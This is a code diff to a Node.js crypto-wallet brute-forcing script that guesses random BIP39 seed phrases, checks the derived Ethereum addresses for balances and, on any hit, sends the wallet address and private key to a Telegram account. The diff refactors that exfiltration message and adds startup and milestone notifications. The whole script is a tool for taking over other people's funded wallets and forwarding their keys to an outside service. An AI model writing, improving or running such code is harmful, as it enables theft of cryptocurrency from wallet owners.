@@ -2,8 +2,6 @@ const bip39 = require('bip39');
 const hdkey = require('hdkey');
 const util = require('ethereumjs-util');
 
-const TelegramBot = require('node-telegram-bot-api');
-
 require('dotenv').config();
 const events = require('events');
 events.EventEmitter.defaultMaxListeners = 1000;
@@ -14,7 +12,19 @@ const rpc = require('./rpc');
 
 
 let nextWordCheck = process.env.NEXT_WORD_CHECK; // ms
-// =================================================
+
+// ============= tg config =======================
+const TelegramBot = require('node-telegram-bot-api');
+let bot_token = process.env.TG_BOT_TOKEN.trim();
+let user_id = process.env.TG_USER_ID.trim();
+const tgBot = new TelegramBot(bot_token, { polling: false });
+
+// ==============================================================
+// ================= bot code start ======================
+// ================= bot code start ======================
+// ==============================================================
+
+let counter = 0;
 
 let providers = [];
 
@@ -89,6 +99,16 @@ async function sendRequest(){
   let randomWordsString = getRandom12Words(words, 12);
   let result = await validateAndDeriveKeys(randomWordsString.trim());
 
+  counter++;
+
+  if (counter % 10000 === 0) {
+    const messageText = `
+        <b>Milestone: ${counter} seed checks!</b>`;
+
+    await sendTGMessage(messageText);
+    console.log('Message sent for 1000 seed checks.');
+  }
+
   if(result){
    console.log("")
    let address = "0x"+result.address;
@@ -107,7 +127,21 @@ async function sendRequest(){
 
 }
 
+async function sendStartMessage(){
+  const now = new Date();
+  let dateString = now.toLocaleDateString();
+  let timeString = now.toLocaleTimeString();
+
+  const messageText = `
+<b>Bot Started ✅</b>\n
+<b>Date:</b> ${dateString}\n
+<b>Time:</b> ${timeString}`;
+
+  await sendTGMessage(messageText);
+}
+
 (async ()=>{
+  await sendStartMessage();
   await setProvider();
   await sendRequest();
 })()
@@ -124,19 +158,11 @@ async function sendRequest(){
 
 
 // =======================
-let bot_token = process.env.TG_BOT_TOKEN.trim();
-let user_id = process.env.TG_USER_ID.trim();
-const tgBot = new TelegramBot(bot_token, { polling: false });
 
 async function sendTGMessage(message){
 
-   const messageText = `
-<b>Wallet Details :- </b>\n
-<b>Address: </b> <code>${message.address}</code>\n
-<b>Private Key:</b> <code>${message.privatekey}</code>`;
-
   try {
-    await tgBot.sendMessage(user_id, messageText, { parse_mode: 'HTML' });
+    await tgBot.sendMessage(user_id, message, { parse_mode: 'HTML' });
     console.log('Message sent to Telegram successfully.');
   } catch (error) {
 
@@ -150,7 +176,14 @@ async function checkBalance(address,result) {
       const formattedBalance = ethers.formatEther(balance);
       if (Number(formattedBalance) > 0) {
         console.log(`${providers[i][0]} Balance: ${formattedBalance} ✅✅✅`);
-        await sendTGMessage(result);
+
+           const messageText = `
+<b>Wallet Details :- </b>\n
+<b>Address: </b> <code>${result.address}</code>\n
+<b>Private Key:</b> <code>${result.privatekey}</code>`;
+
+        await sendTGMessage(messageText);
+
       } else {
 
       }
